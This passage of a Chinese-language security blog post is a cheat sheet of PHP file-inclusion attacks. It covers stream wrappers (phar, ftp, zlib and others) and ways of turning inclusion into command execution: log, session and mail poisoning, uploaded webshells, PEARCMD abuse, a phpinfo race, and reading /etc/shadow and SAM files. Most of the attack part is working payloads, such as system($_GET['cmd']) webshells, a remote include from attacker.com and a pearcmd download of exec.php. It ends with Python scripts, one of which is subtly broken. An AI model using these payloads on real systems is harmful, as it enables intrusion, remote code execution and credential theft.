class="variable">$defaultStub</span>;</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="variable">$stub</span>);</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line">    <span class="comment">//打包PHAR文件</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setPharReadOnly</span>(<span class="literal">true</span>);</span><br><span class="line">    <span class="comment">//可选：出于安全原因，应禁用可写 phar 存档</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Phar created successfully&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Could not create the phar:&#x27;</span>, <span class="variable">$e</span>;</span><br><span class="line">    <span class="comment">//显示错误信息</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phar://本地路径或攻击者主机/malicious.phar/exploit.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="php-memory和php-temp"><a href="#php-memory和php-temp" class="headerlink" title="php:&#x2F;&#x2F;memory和php:&#x2F;&#x2F;temp"></a>php:&#x2F;&#x2F;memory和php:&#x2F;&#x2F;temp</h3><p>php:&#x2F;&#x2F;memory 和 php:&#x2F;&#x2F;temp 是 PHP 中的流包装器，提供对临时内存或基于文件的数据存储的访问。 当攻击者需要使用类似文件的资源来生成临时数据而无需在文件系统上创建实际文件的开销时，这些流包装器特别有用</p>
+<p>1.php:&#x2F;&#x2F;memory</p>
+<p>该包装器使用内存进行流存储。 它的作用就像内存中的文件一样，当用户打开它时，PHP 会创建一个临时缓冲区，可以像标准文件句柄一样使用。 一旦进程终止或流关闭，数据就会丢失，因为它不是持久的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$handle</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;php://memory&#x27;</span>, <span class="string">&#x27;r+&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$handle</span>, <span class="string">&#x27;Hello, Snow Wolf!&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">rewind</span>(<span class="variable">$handle</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">stream_get_contents</span>(<span class="variable">$handle</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$handle</span>);</span><br></pre></td></tr></table></figure>
+
+<p>该数据流仅存在于内存中，不会存在于磁盘上，这使其成为易失性存储选项。</p>
+<p>2.php:&#x2F;&#x2F;temp</p>
+<p>php:&#x2F;&#x2F;temp 流包装器与 php:&#x2F;&#x2F;memory 类似，但有一个区别：如果将一定量的数据写入缓冲区（默认为 2 MB），PHP 将开始将数据写入到临时文件中 系统的临时目录。 这可以防止大量数据消耗服务器内存</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$handle</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;php://temp&#x27;</span>, <span class="string">&#x27;r+&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$handle</span>, <span class="string">&#x27;This is a temporary data stream.&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">rewind</span>(<span class="variable">$handle</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">stream_get_contents</span>(<span class="variable">$handle</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$handle</span>);</span><br></pre></td></tr></table></figure>
+
+<p>关闭句柄后，临时文件（如果已创建）将被删除。</p>
+<p>这些包装器通常无法在本地文件包含 (LFI) 或远程文件包含 (RFI) 漏洞的传统范围内直接利用，因为它们不引用包含可执行 PHP 代码的文件，或者无法通过可注入的路径轻松访问。</p>
+<p>为了使 LFI 或 RFI 能够被利用，攻击者通常需要能够引用指向包含 PHP 代码的文件的路径，并且在 RFI 的情况下，必须将 PHP 安装配置为允许包含来自外部源的文件 （必须启用allow_url_fopen 和allow_url_include）。</p>
+<p>但是，如果存在这样一种情况，攻击者可以将 PHP 进程的输出定向到 php:&#x2F;&#x2F;memory 或 php:&#x2F;&#x2F;temp 流，然后在 include 或 require 语句中重用该流，则可能会出现精心策划的漏洞利用。也就是说，这种场景是非常不标准的，并且在实际的 WEB 应用程序中很少见。</p>
+<h3 id="file"><a href="#file" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h3><p>file:&#x2F;&#x2F; 流包装器是 PHP 中用于访问本地文件系统的默认包装器。 它通常用在打开文件的函数中，例如 fopen()、file_get_contents()、include、require 等，以读取或写入本地文件。 当用户在 PHP 中提供文件路径而不指定包装器时，假定用户引用的是本地文件，并且默认使用 file:&#x2F;&#x2F; 包装器。</p>
+<p>但是，在本地文件包含 (LFI) 的上下文中，攻击者可能会显式使用 file:&#x2F;&#x2F; 包装器来尝试指定服务器端脚本不希望访问的 Web 根目录之外的本地文件。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/vulnerable.php?file=file:///etc/passwd</span><br></pre></td></tr></table></figure>
+
+<h3 id="ftp"><a href="#ftp" class="headerlink" title="ftp:&#x2F;&#x2F;"></a>ftp:&#x2F;&#x2F;</h3><p>PHP 中的 ftp:&#x2F;&#x2F; 包装器用于通过文件传输协议 (FTP) 访问文件。 在处理文件包含漏洞时，允许攻击者包含来自远程 FTP 服务器的文件。</p>
+<p>如果在 php.ini 中启用了 PHP allowed_url_include 指令，攻击者可以在 include 或 require 语句中使用 ftp:&#x2F;&#x2F; URL 包装器来执行托管在外部 FTP 服务器上的 PHP 代码。</p>
+<p>请注意，出于安全原因，默认情况下，allow_url_include 设置为 Off，因为启用它被认为是危险的。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/vulnerable.php?page=ftp://attacker.com/malicious.php</span><br></pre></td></tr></table></figure>
+
+<p>FTP 服务器 (attacker.com) 配置为允许匿名访问，或者攻击者提供有效凭据</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp://username:password@hostname/path/to/file</span><br></pre></td></tr></table></figure>
+
+<h3 id="zlib"><a href="#zlib" class="headerlink" title="zlib:&#x2F;&#x2F;"></a>zlib:&#x2F;&#x2F;</h3><p>PHP 中的 zlib:&#x2F;&#x2F; 流包装器用于 zlib 压缩流处理，它提供读取和写入过滤器以透明地 zlib 压缩&#x2F;解压缩数据。 它可以与 PHP 中的文件函数一起使用，通过创建压缩文件或读取压缩文件来直接操作压缩文件。 在处理 gzip 压缩数据时，这种包装器的用法很常见。</p>
+<p>在渗透测试中，特别是在评估应用程序是否容易受到文件包含攻击时，攻击者可以使用 zlib:&#x2F;&#x2F; 包装器来包含包含恶意代码的本地压缩文件。</p>
+<p>然而，在实践中通过 LFI 来利用这一点需要一组特定的情况：</p>
+<ul>
+<li>攻击者需要对服务器文件系统的写访问权限才能放置压缩文件。</li>
+<li>WEB应用程序必须经过配置或编码不当，才能允许在 include、require 或等效语句中使用 zlib:&#x2F;&#x2F; 包装器。</li>
+<li>必须将服务器配置为执行包含的 .gz 文件中的 PHP 代码。</li>
+</ul>
+<p>在这种情况下，LFI URL 漏洞利用可能类似于：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://vulnerable-website.com/vuln_page.php?file=zlib://path/to/malicious.gz</span><br></pre></td></tr></table></figure>
+
+<p>如果malicious.gz解压为malicious.php，其中包含例如<?php system('command'); ?>，未压缩的 PHP 代码将作为文件包含的结果运行。</p>
+<h3 id="ssh2"><a href="#ssh2" class="headerlink" title="ssh2:&#x2F;&#x2F;"></a>ssh2:&#x2F;&#x2F;</h3><p>PHP 中使用 ssh2:&#x2F;&#x2F; 流包装器通过 Secure Shell (SSH) 协议访问资源。 该包装器是 SSH2 扩展的一部分，并未内置于 PHP 核心中，因此必须通过 PECL 单独安装，或者可能与某些打包的 PHP 版本一起预安装。</p>
+<p>要使用 ssh2:&#x2F;&#x2F; 包装器，必须首先使用 ssh2_connect 函数建立与 SSH 服务器的连接。 连接后，用户可以通过服务器进行身份验证，然后只要拥有正确的权限，就可以访问该服务器上的文件或执行命令。</p>
+<p>以下是如何使用 SSH2 功能连接到远程服务器并检索文件内容的简单示例：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// Make sure to handle errors and exceptions properly in production code.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Connect to SSH</span></span><br><span class="line"><span class="variable">$connection</span> = <span class="title function_ invoke__">ssh2_connect</span>(<span class="string">&#x27;example.com&#x27;</span>, <span class="number">22</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$connection</span>) <span class="keyword">die</span>(<span class="string">&#x27;Connection failed&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Authenticate</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">ssh2_auth_password</span>(<span class="variable">$connection</span>, <span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;password&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Authentication failed&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Fetch file contents over SFTP</span></span><br><span class="line"><span class="variable">$sftp</span>     = <span class="title function_ invoke__">ssh2_sftp</span>(<span class="variable">$connection</span>);</span><br><span class="line"><span class="variable">$filePath</span> = <span class="string">&quot;ssh2.sftp://<span class="subst">&#123;$sftp&#125;</span>/path/to/file.txt&quot;</span>;</span><br><span class="line"><span class="variable">$fileContents</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filePath</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$fileContents</span>; <span class="comment">// display file contents</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Always close the connection when you&#x27;re done</span></span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$connection</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在 PHP 脚本不正确地允许用户输入指定要包含的文件路径的情况下，攻击者可能会尝试通过使用 ssh2:&#x2F;&#x2F; 包装来执行包含恶意代码的文件，该文件存储在远程服务器上。</p>
+<p>需要注意的是，在 include、include_once、require 或 require_once 语句中通过 SSH 访问文件并不常见，并且出于安全原因，PHP 的默认配置通常不支持此类文件包含。</p>
+<h2 id="文件包含到执行命令"><a href="#文件包含到执行命令" class="headerlink" title="文件包含到执行命令"></a>文件包含到执行命令</h2><h3 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://受害者主机地址/ -A <span class="string">&quot;&lt;?php system(\$_GET[&#x27;cmd&#x27;]);?&gt;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/index.php?page=/var/log/apache/access.log</span><br><span class="line">http://example.com/index.php?page=/var/log/apache/error.log</span><br><span class="line">http://example.com/index.php?page=/var/log/apache2/access.log</span><br><span class="line">http://example.com/index.php?page=/var/log/apache2/error.log</span><br><span class="line">http://example.com/index.php?page=/var/log/nginx/access.log</span><br><span class="line">http://example.com/index.php?page=/var/log/nginx/error.log</span><br><span class="line">http://example.com/index.php?page=/var/log/vsftpd.log</span><br><span class="line">http://example.com/index.php?page=/var/log/sshd.log</span><br><span class="line">http://example.com/index.php?page=/var/log/mail</span><br><span class="line">http://example.com/index.php?page=/var/log/httpd/error_log</span><br><span class="line">http://example.com/index.php?page=/usr/local/apache/log/error_log</span><br><span class="line">http://example.com/index.php?page=/usr/local/apache2/log/error_log</span><br></pre></td></tr></table></figure>
+
+<p>SSH日志</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh <span class="string">&#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27;</span>@受害者主机</span><br></pre></td></tr></table></figure>
+
+<p>vsftpd日志</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/var/log/vsftpd.log</span><br><span class="line">http://example.com/index.php?page=/var/log/vsftpd.log</span><br></pre></td></tr></table></figure>
+
+<h3 id="PHP会话"><a href="#PHP会话" class="headerlink" title="PHP会话"></a>PHP会话</h3><p>检查网站是否启用PHP session</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: PHPSESSID=[字符串]; path=/</span><br></pre></td></tr></table></figure>
+
+<p>在PHP中，这些session会存储在&#x2F;var&#x2F;lib&#x2F;php中</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]); ?&gt; //发送此内容为cookie或任意请求参数</span><br><span class="line">../../../../var/lib/php/sess_&lt;session_id&gt;&amp;cmd=<span class="built_in">id</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="proc-pid-fd"><a href="#proc-pid-fd" class="headerlink" title="&#x2F;proc&#x2F;[pid]&#x2F;fd"></a>&#x2F;proc&#x2F;[pid]&#x2F;fd</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=/proc/1234/fd/5</span><br></pre></td></tr></table></figure>
+
+<h3 id="proc-self-environ"><a href="#proc-self-environ" class="headerlink" title="&#x2F;proc&#x2F;self&#x2F;environ"></a>&#x2F;proc&#x2F;self&#x2F;environ</h3><p>修改User-Agent</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php <span class="built_in">echo</span> shell_exec(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proc/self/environ&amp;cmd=<span class="built_in">id</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>shell.png:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>Payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../../../../../../../var/www/html/include/shell.png&amp;cmd=<span class="built_in">id</span></span><br></pre></td></tr></table></figure>
+
+<p>zip</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=zip://path/to/zip/hello.zip%23rce.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h3><p>shell.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>延长时间上传</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -X POST -H <span class="string">&quot;Content-Type: multipart/form-data&quot;</span> -F <span class="string">&quot;file=@shell.php&quot;</span> http://目标WEB应用程序地址/文件上传页面 --limit-rate 1B</span><br></pre></td></tr></table></figure>
+
+<p>检索phpinfo()页面</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://目标WEB程序地址/phpinfo页面 | grep -oE <span class="string">&#x27;/tmp/php[a-zA-Z0-9]+&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>Payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://目标WEB程序地址/文件包含页面?page=/tmp/php[a-zA-Z0-9]+&amp;cmd=<span class="built_in">id</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="compress-zlib-和php-stream-filter-always-prefer-stdio"><a href="#compress-zlib-和php-stream-filter-always-prefer-stdio" class="headerlink" title="compress.zlib:&#x2F;&#x2F;和php.stream_filter.always_prefer_stdio"></a>compress.zlib:&#x2F;&#x2F;和php.stream_filter.always_prefer_stdio</h3><p>payload.php:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;whoami&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>压缩</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gzip -c payload.php &gt; payload.php.gz</span><br></pre></td></tr></table></figure>
+
+<p>Payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://目标WEB程序地址/文件包含页面?page=compress.zlib://../../../../../../../../../var/www/html/include/payload.php.gz</span><br></pre></td></tr></table></figure>
+
+<h3 id="PEARCMD"><a href="#PEARCMD" class="headerlink" title="PEARCMD"></a>PEARCMD</h3><ul>
+<li><p>创建配置文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/vuln.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=<span class="built_in">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])?&gt;+/tmp/exec.php</span><br><span class="line">/vuln.php?file=/tmp/exec.php&amp;cmd=phpinfo();die();</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>man_dir</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/vuln.php?file=/usr/local/lib/php/pearcmd.php&amp;+-c+/tmp/exec.php+-d+man_dir=&lt;?<span class="built_in">echo</span>(system(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]));?&gt;+-s+</span><br><span class="line">/vuln.php?file=/tmp/exec.php&amp;c=<span class="built_in">id</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>创建的配置文件包含webshell</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#PEAR_Config 0.9</span></span><br><span class="line">a:<span class="number">2</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot;__channels&quot;</span>;a:<span class="number">2</span>:&#123;s:<span class="number">12</span>:<span class="string">&quot;pecl.php.net&quot;</span>;a:<span class="number">0</span>:&#123;&#125;s:<span class="number">5</span>:<span class="string">&quot;__uri&quot;</span>;a:<span class="number">0</span>:&#123;&#125;&#125;s:<span class="number">7</span>:<span class="string">&quot;man_dir&quot;</span>;s:<span class="number">29</span>:<span class="string">&quot;&lt;?echo(system(<span class="subst">$_GET</span>[&#x27;c&#x27;]));?&gt;&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>下载</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/vuln.php?file=/usr/local/lib/php/pearcmd.php&amp;+download+http://&lt;ip&gt;:&lt;port&gt;/exec.php</span><br><span class="line">/vuln.php?file=exec.php&amp;c=<span class="built_in">id</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>安装</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/vuln.php?file=/usr/local/lib/php/pearcmd.php&amp;+install+http://&lt;ip&gt;:&lt;port&gt;/exec.php</span><br><span class="line">/vuln.php?file=/tmp/pear/download/exec.php&amp;c=<span class="built_in">id</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="凭据"><a href="#凭据" class="headerlink" title="凭据"></a>凭据</h3><p>Windows</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/index.php?page=../../../../../../WINDOWS/repair/sam</span><br><span class="line">http://example.com/index.php?page=../../../../../../WINDOWS/repair/system</span><br></pre></td></tr></table></figure>
+
+<p>Linux</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/index.php?page=../../../../../../etc/shadow</span><br></pre></td></tr></table></figure>
+
+<h3 id="邮件"><a href="#邮件" class="headerlink" title="邮件"></a>邮件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# telnet 10.10.10.10. 25</span><br><span class="line">Trying 10.10.10.10....</span><br><span class="line">Connected to 10.10.10.10..</span><br><span class="line">Escape character is <span class="string">&#x27;^]&#x27;</span>.</span><br><span class="line">220 straylight ESMTP Postfix (Debian/GNU)</span><br><span class="line">helo ok</span><br><span class="line">250 straylight</span><br><span class="line">mail from: mail@example.com</span><br><span class="line">250 2.1.0 Ok</span><br><span class="line">rcpt to: root</span><br><span class="line">250 2.1.5 Ok</span><br><span class="line">data</span><br><span class="line">354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;</span><br><span class="line">subject: &lt;?php <span class="built_in">echo</span> system(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]); ?&gt;</span><br><span class="line">data2</span><br><span class="line">.</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mail -s <span class="string">&quot;&lt;?php system(<span class="variable">$_GET</span>[&#x27;cmd&#x27;]);?&gt;&quot;</span> www-data@10.10.10.10. &lt; /dev/null</span><br></pre></td></tr></table></figure>
+
+<p>Payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/index.php?page=/var/log/mail</span><br></pre></td></tr></table></figure>
+
+<h3 id="分段错误"><a href="#分段错误" class="headerlink" title="分段错误"></a>分段错误</h3><p>如果发送一个包含文件的 POST 请求，PHP 会在其中创建一个临时文件&#x2F;tmp&#x2F;php&lt;&gt;与该文件的内容。 处理请求后，该文件将自动删除。</p>
+<p>如果发现 LFI 并且设法触发 PHP 中的分段错误，则临时文件将永远不会被删除。 因此，可以利用LFI漏洞进行搜索，直到找到并执行任意代码。</p>
+<p>分段错误Payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// PHP 7.0</span><br><span class="line">include(<span class="string">&quot;php://filter/string.strip_tags/resource=/etc/passwd&quot;</span>);</span><br><span class="line"></span><br><span class="line">// PHP 7.2</span><br><span class="line">include(<span class="string">&quot;php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>上传有分段错误的文件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://localhost:8008/index.php?i=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span></span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>: <span class="built_in">open</span>(<span class="string">&#x27;la.php&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)&#125;</span><br><span class="line">response = requests.post(url, files=files)</span><br></pre></td></tr></table></figure>
+
+<p>搜索文件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">charset = string.ascii_letters + string.digits</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port = <span class="number">80</span></span><br><span class="line">base_url = <span class="string">&quot;http://%s:%d&quot;</span> % (host, port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bruteforce</span>(<span class="params">charset</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> charset:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> charset:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> charset:</span><br><span class="line">                <span class="keyword">for</span> l <span class="keyword">in</span> charset:</span><br><span class="line">                    <span class="keyword">for</span> m <span class="keyword">in</span> charset:</span><br><span class="line">                        <span class="keyword">for</span> n <span class="keyword">in</span> charset:</span><br><span class="line">                            filename = prefix + i + j + k</span><br><span class="line">                            url = <span class="string">&quot;%s/index.php?i=/tmp/php%s&quot;</span> % (base_url, filename)</span><br><span class="line">                            <span class="built_in">print</span> url</span><br><span class="line">                            response = requests.get(url)</span><br><span class="line">                            <span class="keyword">if</span> <span class="string">&#x27;spyd3r&#x27;</span> <span class="keyword">in</span> response.content:</span><br><span class="line">                                <span class="built_in">print</span> <span class="string">&quot;[+] Include success!&quot;</span></span><br><span class="line">                                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    bruteforce(charset)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
